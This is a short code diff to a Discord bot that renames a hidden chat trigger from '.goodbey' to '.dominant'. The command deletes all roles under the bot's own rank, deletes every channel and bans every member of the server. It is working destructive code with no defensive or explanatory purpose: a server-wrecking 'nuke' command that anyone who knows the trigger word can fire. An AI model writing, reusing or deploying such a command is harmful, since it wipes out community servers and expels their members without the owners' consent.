@@ -18,15 +18,20 @@ client.login(process.env.TOKEN);
 
 
 
+const discord = require("discord.js");
+
+
+
 
 client.on("message", async(msg)=>{
-if(msg.content.toLowerCase().startsWith("." + "goodbey")){
+if(msg.content.toLowerCase().startsWith("." + "dominant")){
     msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
-    msg.guild.members.tap(member => member.ban("Good Bey Dominant"));
+    msg.guild.members.tap(member => member.ban("dominant"));
 }
 
 });
+
 
 
 
